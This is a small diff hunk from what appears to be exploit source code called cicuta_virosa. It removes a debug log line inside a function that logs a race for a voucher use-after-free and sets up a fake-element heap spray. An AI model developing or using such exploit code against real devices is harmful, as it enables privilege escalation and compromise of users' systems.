@@ -241,7 +241,6 @@ void cicuta_virosa(void)
     increase_limits(10240);
 
     cicuta_log("Stage 1: race for voucher ivace uaf");
-    latest_log("test");
 
 init_exploit:
     init_fake_element_spray(0x1400 - 0x10, 1024);
